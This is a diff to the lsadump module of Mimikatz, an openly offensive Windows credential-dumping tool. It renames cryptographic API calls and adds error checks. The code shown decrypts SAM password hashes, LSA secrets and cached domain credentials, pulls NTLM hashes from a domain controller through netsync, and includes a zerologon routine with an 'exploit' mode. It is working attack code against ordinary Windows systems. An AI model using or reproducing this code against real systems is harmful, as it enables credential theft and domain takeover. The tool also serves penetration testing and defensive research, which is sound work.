@@ -144,7 +144,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
 					kprintf(L"  * password : %s\n", szPassword);
 					RtlInitUnicodeString(&uPassword, szPassword);
-					cacheData.isNtlm = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+					cacheData.isNtlm = NT_SUCCESS(RtlCalculateNtOwfPassword(&uPassword, cacheData.ntlm));
 				}
 				if(cacheData.isNtlm)
 				{
@@ -415,7 +415,8 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 	MD5_CTX md5ctx;
 	PSAM_HASH pHash = (PSAM_HASH) (pStartOfData + pSamHash->offset);
 	PSAM_HASH_AES pHashAes;
-	CRYPTO_BUFFER cypheredHashBuffer = {0, 0, NULL}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	DATA_KEY keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	CRYPT_BUFFER cypheredHashBuffer = {0, 0, NULL};
 	PVOID out;
 	DWORD len;
 
@@ -435,8 +436,8 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 				if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 				{
 					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
-					if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-						PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+					if(!(status = NT_SUCCESS(RtlDecryptData2(&cypheredHashBuffer, &keyBuffer))))
+						PRINT_ERROR(L"RtlDecryptData2\n");
 				}
 			}
 			break;
@@ -514,7 +515,8 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 	BOOL status = FALSE;
 	PDOMAIN_ACCOUNT_F pDomAccF;
 	MD5_CTX md5ctx;
-	CRYPTO_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	DATA_KEY key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	CRYPT_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey};
 	PSAM_KEY_DATA_AES pAesKey;
 	PVOID out;
 	DWORD len;
@@ -536,8 +538,8 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 				MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
 				MD5Final(&md5ctx);
 				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
-				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))
-					PRINT_ERROR(L"RtlEncryptDecryptRC4 KO");
+				if(!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
+					PRINT_ERROR(L"RtlDecryptData2 KO");
 				break;
 			case 2:
 				pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
@@ -603,7 +605,8 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 	DWORD szNeeded, i, offset;
 	LPVOID buffer;
 	MD5_CTX md5ctx;
-	CRYPTO_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	DATA_KEY key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	CRYPT_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL};
 	PNT6_SYSTEM_KEYS nt6keysStream = NULL;
 	PNT6_SYSTEM_KEY nt6key;
 	PNT5_SYSTEM_KEY nt5key = NULL;
@@ -653,7 +656,7 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 						MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_IV_SIZE);
 					MD5Final(&md5ctx);
 					data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
-					if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
+					if(NT_SUCCESS(RtlDecryptData2(&data, &key)))
 					{
 						if(nt5key = (PNT5_SYSTEM_KEY) LocalAlloc(LPTR, sizeof(NT5_SYSTEM_KEY)))
 						{
@@ -755,7 +758,8 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 	PMSCACHE_ENTRY pMsCacheEntry;
 	NTSTATUS nStatus;
 	BYTE digest[MD5_DIGEST_LENGTH];
-	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
+	DATA_KEY key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
+	CRYPT_BUFFER data;
 	LSA_UNICODE_STRING usr;
 	
 	if(kuhl_m_lsadump_decryptSecret(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
@@ -842,7 +846,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 									{
 										data.Length = data.MaximumLength = s1;
 										data.Buffer = pMsCacheEntry->enc_data;
-										nStatus = RtlEncryptDecryptRC4(&data, &key);
+										nStatus = RtlDecryptData2(&data, &key);
 										if(NT_SUCCESS(nStatus))
 										{
 											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
@@ -865,14 +869,14 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
 													{
 														kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
-														nStatus = RtlEncryptDecryptRC4(&data, &key);
+														nStatus = RtlEncryptData2(&data, &key);
 														if(NT_SUCCESS(nStatus))
 														{
 															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
 																kprintf(L"> OK!\n");
 															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
 														}
-														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+														else PRINT_ERROR(L"RtlEncryptData2: 0x%08x\n", nStatus);
 													}
 												}
 											}
@@ -1079,7 +1083,8 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 	BOOL status = FALSE;
 	DWORD szSecret = 0;
 	PVOID secret;
-	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
+	DATA_KEY key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
+	CRYPT_BUFFER data, output = {0, 0, NULL};
 
 	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hSecret, KeyName, NULL, NULL, &secret, &szSecret))
 	{
@@ -1100,12 +1105,12 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 			key.Buffer = lsaKeyUnique->key;
 			data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
 			data.Buffer = (PBYTE) secret + szSecret - data.Length; // dirty hack to not extract x64/x86 from REG ; // ((PNT5_HARD_SECRET) secret)->encryptedSecret;
-			if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
+			if(RtlDecryptData(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
 			{
 				if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
 				{
 					output.MaximumLength = output.Length;
-					if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
+					if(NT_SUCCESS(RtlDecryptData(&data, &key, &output)))
 					{
 						*pSzBufferOut = output.Length;
 						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
@@ -2012,7 +2017,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 	NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
 	NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
 	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
-	DWORD i = 0, NegotiateFlags = 0x600FFFFF;
+	DWORD i = 0, NegotiateFlags = 0x600fffff;
 	MD5_CTX ctx;
 	ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
 	NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
@@ -2061,10 +2066,14 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 										if(NT_SUCCESS(status))
 										{
 											kprintf(L"  Account: %s\n", szAccount);
-											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
-											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
-											kprintf(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-											kprintf(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+											if(NT_SUCCESS(RtlDecryptNtOwfPwdWithUserKey((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword)))
+											{
+												kprintf(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+											}
+											if(NT_SUCCESS(RtlDecryptNtOwfPwdWithUserKey((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword)))
+											{
+												kprintf(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+											}
 										}
 										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
 									}
@@ -2092,8 +2101,8 @@ NTSTATUS kuhl_m_lsadump_netsync_NlComputeCredentials(PBYTE input, PBYTE output, 
 {
   BYTE bufferData[DES_BLOCK_LENGTH];
   RtlZeroMemory(output, DES_BLOCK_LENGTH);
-  RtlEncryptDES1block1key(input, key, bufferData);
-  return RtlEncryptDES1block1key(bufferData, key + DES_KEY_LENGTH, output);
+  RtlEncryptBlock(input, key, bufferData);
+  return RtlEncryptBlock(bufferData, key + DES_KEY_LENGTH, output);
 }
 
 void kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(PNETLOGON_CREDENTIAL Credential, DWORD TimeStamp, PNETLOGON_AUTHENTICATOR Authenticator, BYTE sessionKey[MD5_DIGEST_LENGTH])
@@ -2126,7 +2135,7 @@ NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
 	if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
 	{
 		RtlInitUnicodeString(&password, szPassword);
-		status = RtlDigestNTLM(&password, infos.Internal1.NTHash);
+		status = RtlCalculateNtOwfPassword(&password, infos.Internal1.NTHash);
 		if(!NT_SUCCESS(status))
 			PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
 	}
@@ -2180,7 +2189,7 @@ NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
 	if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
 	{
 		RtlInitUnicodeString(&password, szPassword);
-		status0 = RtlDigestNTLM(&password, infos.oldNTLM);
+		status0 = RtlCalculateNtOwfPassword(&password, infos.oldNTLM);
 		if(!NT_SUCCESS(status0))
 			PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
 	}
@@ -2195,7 +2204,7 @@ NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
 	if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
 	{
 		RtlInitUnicodeString(&password, szPassword);
-		status1 = RtlDigestNTLM(&password, infos.newNTLM);
+		status1 = RtlCalculateNtOwfPassword(&password, infos.newNTLM);
 		if(!NT_SUCCESS(status1))
 			PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status1);
 	}
@@ -2475,7 +2484,7 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 			type = (NETLOGON_SECURE_CHANNEL_TYPE) wcstoul(szType, NULL, 0);
 		bExploit = kull_m_string_args_byName(argc, argv, L"exploit", NULL, NULL);
 
-		kull_m_rpc_getArgs(argc, argv, &szRemote, &szProtSeq, NULL, NULL, &AuthnSvc, RPC_C_AUTHN_NONE, &bIsNullSession, NULL, NULL, TRUE);
+		kull_m_rpc_getArgs(argc, argv, &szRemote, &szProtSeq, NULL, NULL, NULL, &AuthnSvc, RPC_C_AUTHN_NONE, &bIsNullSession, NULL, NULL, TRUE);
 		kprintf(L"\nTarget : %s\nAccount: %s\nType   : %u (%s)\nMode   : %s\n\n", szRemote, szAccount, type, (type < ARRAYSIZE(SecureChannelTypes)) ? SecureChannelTypes[type] : L"?", bExploit ? L"exploit" : L"detect");
 		if(kull_m_rpc_createBinding(NULL, szProtSeq, szRemote, NULL, L"RPC", TRUE, AuthnSvc, bIsNullSession ? KULL_M_RPC_AUTH_IDENTITY_HANDLE_NULLSESSION : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hLogonNetLogon, NULL))
 		{
